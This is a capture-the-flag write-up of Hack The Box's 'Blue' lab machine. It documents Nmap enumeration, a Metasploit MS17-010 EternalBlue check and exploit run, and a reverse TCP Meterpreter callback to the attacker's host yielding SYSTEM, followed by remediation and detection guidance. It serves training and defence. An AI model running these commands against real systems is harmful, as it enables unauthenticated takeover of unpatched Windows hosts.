Hack The Box / Easy / Windows

Blue

Blue is a Windows 7 Professional SP1 x64 host (HARIS-PC, workgroup WORKGROUP) exposing MSRPC on 135 and SMB on 139/445. Enumeration identified an SMBv1 stack with message signing disabled and the guest account active. A vulnerability check confirmed MS17-010 (EternalBlue), and the Metasploit module exploit/windows/smb/ms17_010_eternalblue produced an unauthenticated remote kernel pool overwrite. The first exploit run failed with the default 12 groom allocations and the module automatically retried with 17 allocations, completing the ETERNALBLUE overwrite and delivering a Meterpreter stage that yielded an NT AUTHORITY\SYSTEM session. A Windows shell then confirmed Administrator Desktop access and the root proof was read.

Retired · Authorized laboratory assessment · Reviewed: 2025-12-19

Dylan Senez / D4RKGUNN3R

SMB enumeration on Windows 7 SP1, MS17-010 EternalBlue kernel pool corruption, Metasploit groom-allocation retry, unauthenticated SYSTEM session, disabled SMB message signing

Case overview

Outcome

Unauthenticated remote code execution yielding an NT AUTHORITY\SYSTEM Meterpreter session; root proof read from C:\Users\Administrator\Desktop\root.txt.

Key takeaway

A single unpatched SMBv1 memory-corruption flaw on an end-of-life Windows 7 SP1 host translated an unauthenticated network position into full SYSTEM control in roughly seven minutes, and a disabled signing policy plus an active guest account widened the exposure.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Nmap full TCP scan (135/139/445) -> SMB profile showing Windows 7 SP1 x64, signing disabled, guest active -> Metasploit ms17_010_eternalblue check confirms MS17-010 -> first EternalBlue run fails at 12 groom allocations -> automatic retry with 17 groom allocations completes the overwrite -> Meterpreter SYSTEM session -> Windows shell, dir C:\Users enumerates Administrator/haris/Public -> root proof read from Administrator Desktop.

1. Reconnaissance — Full TCP scan with service detection

Validated · Kali / attacker · EVD-001

Artifact

Nmap full TCP scan output

Command / request

nmap -sV -sC -p- 198.51.100.10 -T4 --min-rate 5000

Observed result

Scan covered all 65,535 TCP ports and completed in 131.84 seconds, identifying 8 open TCP ports. Key services: 135/tcp msrpc (Microsoft Windows RPC), 139/tcp netbios-ssn, 445/tcp microsoft-ds (Windows 7 Professional 7601 Service Pack 1). Host: HARIS-PC, workgroup WORKGROUP, OS Windows. NSE reported SMB message signing disabled ("dangerous, but default") with the guest account active, and SMB2 message signing enabled but not required.

Analysis

The host is a Windows 7 SP1 x64 system with SMBv1/v2 exposed. Disabled SMB signing and an active guest account are notable SMB configuration weaknesses, and the Windows 7 SP1 platform is a known candidate for MS17-010.

Why this mattered

Establishes the reachable SMB surface and the version fingerprint that drives vulnerability selection.

2. Reconnaissance — Metasploit MS17-010 vulnerability check

Validated · Kali / attacker · EVD-002

Artifact

Metasploit auxiliary scanner output

Command / request

use exploit/windows/smb/ms17_010_eternalblue ; set RHOSTS 198.51.100.10 ; set LHOST 198.51.100.20 ; run

Observed result

Selected exploit module exploit/windows/smb/ms17_010_eternalblue (Rank: average, Check: Yes). Its check used auxiliary/scanner/smb/smb_ms17_010 and reported: "Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)" and "The target is vulnerable."

Analysis

The module's own version check confirms the vulnerable build and architecture, matching the Windows 7 SP1 x64 fingerprint from the Nmap scan.

Why this mattered

Confirms exploitability before incurring the disruptive kernel-memory grooming that the exploit performs.

3. Exploitation — EternalBlue run 1 (default groom allocations) fails

Validated · Kali / attacker · EVD-003

Artifact

Metasploit exploitation output

Command / request

exploit (default 12 groom allocations)

Observed result

The exploit connected to the target, validated OS and architecture, sent SMBv2 buffers and triggered memory corruption (status 0xC000000D), but grooming with 12 allocations resulted in FAIL and no session was created; the exploit module automatically retried.

Analysis

Kernel pool grooming is probabilistic and the default allocation count was insufficient on this host; the module's automatic retry mechanism handles this transparently.

Why this mattered

Documents the observed failure so the successful retry parameters are attributable rather than assumed.

4. Exploitation — EternalBlue run 2 (17 groom allocations) succeeds

Validated · Kali / attacker · EVD-004

Artifact

Metasploit session output

Command / request

automatic retry (17 groom allocations)

Observed result

With 17 groom allocations the exploit repeated connection, OS validation and buffer manipulation; the ETERNALBLUE overwrite completed successfully (0xC000000D) and a 230,982-byte stage was sent to 198.51.100.10. Meterpreter session 1 opened as a reverse TCP connection 198.51.100.20:4444 -> 198.51.100.10:49158 at the recorded 10:54:55 time, running with NT AUTHORITY\SYSTEM privileges.

Analysis

The completed overwrite chained unauthenticated SMB access directly to SYSTEM; no credentials or authenticated foothold were involved.

Why this mattered

Establishes the initial-access-to-SYSTEM transition that the rest of the assessment depends on.

Findings & remediation

F-1 — MS17-010 EternalBlue SMB remote code execution

Critical · Validated · 198.51.100.10:445 (HARIS-PC), Windows 7 Professional 7601 SP1 x64

Description

The target is vulnerable to MS17-010, a memory-corruption flaw in the SMBv1 implementation that allows remote kernel pool corruption via specially crafted packets (CVE-2017-0143 through CVE-2017-0148). The vulnerability was weaponized as EternalBlue and was the vector for the WannaCry and NotPetya outbreaks.

Impact

Unauthenticated remote code execution with NT AUTHORITY\SYSTEM privileges, enabling complete control of the host, creation of accounts with full rights, data theft or destruction, ransomware deployment, and use of the host as a pivot.

Root cause

An unpatched SMBv1 stack on an end-of-life Windows 7 SP1 platform that remains reachable on TCP/445.

Remediation

  • Apply Microsoft Security Bulletin MS17-010 (e.g. KB4012212 for Windows 7 SP1), or remove SMBv1 and enforce SMBv2+ with signing required; migrate off Windows 7 and restrict SMB (445/139) to trusted networks.

Validation

  • The Metasploit module check reported the host vulnerable, and the EternalBlue exploit completed the overwrite and returned a working NT AUTHORITY\SYSTEM Meterpreter session that read the Administrator root proof.

F-2 — SMB message signing disabled

Medium · Validated · 198.51.100.10:445 (SMB), Windows 7 Professional SP1

Description

SMB message signing is disabled on the target. Although SMB2 signing is reported as enabled but not required, the server accepts unsigned SMB packets (CWE-300, channel accessible by non-endpoint).

Impact

An attacker positioned on the network can perform SMB relay and man-in-the-middle attacks, modify SMB traffic in transit, and relay captured NTLM authentication to other services.

Root cause

Default Windows SMB signing policy that does not require signing on the SMB server.

Remediation

  • Require SMB signing on the server and clients, and combine with disabling NTLM relay opportunities through network segmentation.

Validation

  • Nmap NSE smb-security-mode reported message_signing: disabled (dangerous, but default), observed in the service-detection scan.

F-3 — Guest account active over SMB

Low · Validated · 198.51.100.10:445 (SMB), Windows 7 Professional SP1

Description

The NSE scan reported the guest account active on the SMB service, permitting unauthenticated SMB access under the guest identity.

Impact

Guest SMB access broadens unauthenticated reach and can assist relay or reconnaissance activity, though the compromise of this host was achieved through MS17-010 rather than guest access.

Root cause

A permissive SMB configuration that leaves the built-in guest account enabled.

Remediation

  • Disable the guest account and remove its SMB access, then review share-level permissions for unauthenticated access.

Validation

  • Observed in the Nmap NSE service-detection output (guest account active, smb-security-mode account_used: guest).

Analysis

The host's risk is a single critical SMBv1 memory-corruption vulnerability reachable without authentication, made worse by an unsupported OS version and a permissive SMB configuration (message signing disabled, guest account active). No credentials were required at any point; the exploit chained directly to SYSTEM.

Remediation

  • Apply MS17-010 (e.g. KB4012212 for Windows 7 SP1) or remove SMBv1 and enforce SMBv2+ with signing required, migrate off the end-of-life Windows 7 platform, disable guest SMB access, and restrict SMB (445/139) exposure to trusted networks with segmentation and host firewalls.

Defender perspective

Detect EternalBlue tradecraft by watching for SMBv1 pool-grooming traffic patterns, repeated connection attempts with varying grooming allocation counts, and kernel pool anomalies; enable SMB signing, remove SMBv1, and patch MS17-010 as the priority control.

Detection opportunities

  • Monitor SMBv1 use and unusual SMB buffer patterns associated with EternalBlue, alert on unexpected guest SMB logons and SMB sessions to 445 from untrusted segments, and verify MS17-010 patch state through patch-management and vulnerability scanning.

Lessons learned

  • Leaving SMBv1 enabled on an end-of-life host keeps a wormable, unauthenticated RCE path open; signing and the guest account are secondary controls that only widen an already critical exposure rather than being standalone findings.

Open questions

  • The retained notes record only the Administrator root proof; no separate low-privilege user proof for this host is captured in the source, so the assessment documents the SYSTEM-level path only.

Troubleshooting & success factors

  • The initial EternalBlue run with the module default of 12 groom allocations failed during pool grooming (memory-corruption status 0xC000000D surfaced but no session was created); the module's automatic retry with 17 groom allocations succeeded and opened the Meterpreter session.
